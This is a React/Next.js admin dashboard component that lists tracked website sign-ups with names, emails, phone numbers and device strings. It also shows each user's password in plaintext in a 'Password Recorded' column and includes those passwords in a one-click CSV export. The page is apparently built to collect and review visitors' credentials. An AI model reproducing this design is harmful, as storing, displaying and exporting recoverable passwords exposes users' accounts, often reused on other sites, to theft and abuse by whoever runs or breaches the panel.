'use client';

import React, { useState, useEffect } from 'react';
import {
  Users,
  Search,
  Download,
  Mail,
  Phone,
  Calendar,
  Shield,
  Smartphone,
  KeyRound,
  RefreshCw,
} from 'lucide-react';

interface RegisteredUserItem {
  _id: string;
  name: string;
  email: string;
  phone: string;
  password?: string;
  authProvider: string;
  userAgent?: string;
  createdAt: string;
}

export default function RegisteredUsersPage() {
  const [users, setUsers] = useState<RegisteredUserItem[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [providerFilter, setProviderFilter] = useState('all');

  const fetchUsers = async () => {
    setLoading(true);
    try {
      const res = await fetch('/api/registered-users');
      if (res.ok) {
        const data = await res.json();
        setUsers(data.users || []);
      }
    } catch (err) {
      console.error('Error fetching registered users:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchUsers();
  }, []);

  const filteredUsers = users.filter((u) => {
    const matchesSearch =
      (u.name && u.name.toLowerCase().includes(search.toLowerCase())) ||
      (u.email && u.email.toLowerCase().includes(search.toLowerCase())) ||
      (u.phone && u.phone.includes(search));

    const matchesProvider =
      providerFilter === 'all' || u.authProvider === providerFilter;

    return matchesSearch && matchesProvider;
  });

  const exportCSV = () => {
    const headers = ['Name', 'Email', 'Phone', 'Auth Provider', 'Password', 'Device Info', 'Registration Date'];
    const rows = filteredUsers.map((u) => [
      `"${u.name || ''}"`,
      `"${u.email || ''}"`,
      `"${u.phone || ''}"`,
      `"${u.authProvider || ''}"`,
      `"${u.password || ''}"`,
      `"${(u.userAgent || '').replace(/"/g, '""')}"`,
      `"${new Date(u.createdAt).toLocaleString('en-GB')}"`,
    ]);

    const csvContent = [headers.join(','), ...rows.map((r) => r.join(','))].join('\n');
    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.setAttribute('download', `tracked-website-users-${new Date().toISOString().slice(0, 10)}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className="space-y-6">
      {/* Page Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div>
          <h1 className="text-2xl font-serif font-bold text-stone-900 tracking-tight">
            Tracked Website Visitors & Users
          </h1>
          <p className="text-xs text-stone-500 mt-1">
            Real-time registry of public visitors who signed up, submitted phone numbers, or logged in on the website.
          </p>
        </div>

        <div className="flex items-center gap-3">
          <button
            onClick={fetchUsers}
            disabled={loading}
            className="inline-flex items-center gap-1.5 px-3.5 py-2 border border-stone-300 rounded-xl bg-white text-xs font-semibold text-stone-700 hover:bg-stone-50 shadow-2xs transition-colors"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} />
            Refresh
          </button>
          <button
            onClick={exportCSV}
            className="inline-flex items-center gap-1.5 px-4 py-2 rounded-xl bg-[#064E3B] hover:bg-[#052E16] text-white text-xs font-bold shadow-xs transition-colors"
          >
            <Download className="w-3.5 h-3.5" />
            Export CSV ({filteredUsers.length})
          </button>
        </div>
      </div>

      {/* KPI Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="bg-white p-5 rounded-2xl border border-stone-200 shadow-2xs">
          <span className="text-xs font-semibold text-stone-500">Total Tracked Users</span>
          <div className="text-2xl font-bold text-stone-900 mt-1">{users.length}</div>
        </div>
        <div className="bg-white p-5 rounded-2xl border border-stone-200 shadow-2xs">
          <span className="text-xs font-semibold text-stone-500">Email & Password Users</span>
          <div className="text-2xl font-bold text-emerald-800 mt-1">
            {users.filter((u) => u.authProvider === 'credentials').length}
          </div>
        </div>
        <div className="bg-white p-5 rounded-2xl border border-stone-200 shadow-2xs">
          <span className="text-xs font-semibold text-stone-500">Google Login Users</span>
          <div className="text-2xl font-bold text-amber-700 mt-1">
            {users.filter((u) => u.authProvider === 'google').length}
          </div>
        </div>
      </div>

      {/* Search & Filter Toolbar */}
      <div className="bg-white p-4 rounded-2xl border border-stone-200 shadow-2xs flex flex-col sm:flex-row gap-3">
        <div className="relative flex-1">
          <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-stone-400" />
          <input
            type="text"
            placeholder="Search by name, email, or phone number..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="w-full pl-9 pr-3 py-2 text-xs border border-stone-300 rounded-xl bg-[#FAF8F5] focus:outline-hidden focus:ring-2 focus:ring-emerald-500"
          />
        </div>

        <select
          value={providerFilter}
          onChange={(e) => setProviderFilter(e.target.value)}
          className="text-xs border border-stone-300 rounded-xl px-3 py-2 bg-[#FAF8F5] text-stone-700 focus:outline-hidden focus:ring-2 focus:ring-emerald-500"
        >
          <option value="all">All Login Methods</option>
          <option value="email">Email Login & Register</option>
          <option value="phone">Phone & Password</option>
          <option value="google">Google Login</option>
          <option value="credentials">Credentials</option>
        </select>
      </div>

      {/* Data Table */}
      <div className="bg-white rounded-2xl border border-stone-200 shadow-2xs overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full min-w-[700px] text-left border-collapse text-xs">
            <thead>
              <tr className="bg-stone-50 border-b border-stone-200 text-stone-500 uppercase tracking-wider font-semibold text-[11px]">
                <th className="py-3.5 px-4">User Details</th>
                <th className="py-3.5 px-4">Contact (Phone & Email)</th>
                <th className="py-3.5 px-4">Login Method</th>
                <th className="py-3.5 px-4">Password Recorded</th>
                <th className="py-3.5 px-4">Device / Client</th>
                <th className="py-3.5 px-4">Tracked On</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-stone-100">
              {loading ? (
                <tr>
                  <td colSpan={6} className="py-12 text-center text-stone-400">
                    Loading registered visitor records...
                  </td>
                </tr>
              ) : filteredUsers.length === 0 ? (
                <tr>
                  <td colSpan={6} className="py-12 text-center text-stone-400">
                    No registered user records found matching criteria.
                  </td>
                </tr>
              ) : (
                filteredUsers.map((user) => (
                  <tr key={user._id} className="hover:bg-stone-50/80 transition-colors">
                    <td className="py-3.5 px-4">
                      <div className="font-bold text-stone-900">{user.name}</div>
                      <span className="text-[10px] text-stone-400 font-mono">ID: {user._id}</span>
                    </td>
                    <td className="py-3.5 px-4">
                      <div className="flex items-center gap-1.5 text-stone-800 font-medium">
                        <Phone className="w-3.5 h-3.5 text-emerald-700" />
                        <span>{user.phone || 'Not provided'}</span>
                      </div>
                      <div className="flex items-center gap-1.5 text-stone-500 text-[11px] mt-0.5">
                        <Mail className="w-3 h-3 text-stone-400" />
                        <span>{user.email || 'Not provided'}</span>
                      </div>
                    </td>
                    <td className="py-3.5 px-4">
                      {user.authProvider === 'google' ? (
                        <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-bold bg-blue-50 text-blue-800 border border-blue-200">
                          <svg className="w-3 h-3" viewBox="0 0 24 24">
                            <path
                              fill="#4285F4"
                              d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"
                            />
                            <path
                              fill="#34A853"
                              d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.25v3.15C3.26 21.36 7.36 24 12 24z"
                            />
                            <path
                              fill="#FBBC05"
                              d="M5.28 14.27c-.25-.72-.38-1.49-.38-2.27s.13-1.55.38-2.27V6.58H1.25C.45 8.17 0 9.99 0 12s.45 3.83 1.25 5.42l4.03-3.15z"
                            />
                            <path
                              fill="#EA4335"
                              d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.36 0 3.26 2.64 1.25 6.58l4.03 3.15c.95-2.83 3.6-4.98 6.72-4.98z"
                            />
                          </svg>
                          Google Login
                        </span>
                      ) : user.authProvider === 'phone' ? (
                        <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-bold bg-amber-50 text-amber-900 border border-amber-200">
                          <Phone className="w-3 h-3 text-amber-700" />
                          Phone & Password
                        </span>
                      ) : (
                        <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-bold bg-emerald-50 text-emerald-800 border border-emerald-200">
                          <Mail className="w-3 h-3 text-emerald-700" />
                          Email & Password
                        </span>
                      )}
                    </td>
                    <td className="py-3.5 px-4 font-mono text-[11px]">
                      {user.password ? (
                        <span className="bg-stone-100 text-stone-800 px-2 py-0.5 rounded border border-stone-200">
                          {user.password}
                        </span>
                      ) : (
                        <span className="text-stone-400 italic">None (OAuth)</span>
                      )}
                    </td>
                    <td className="py-3.5 px-4 text-stone-500 text-[11px] max-w-[200px] truncate" title={user.userAgent}>
                      {user.userAgent || 'Web Browser'}
                    </td>
                    <td className="py-3.5 px-4 text-stone-600 font-mono text-[11px]">
                      {new Date(user.createdAt).toLocaleString('en-GB')}
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
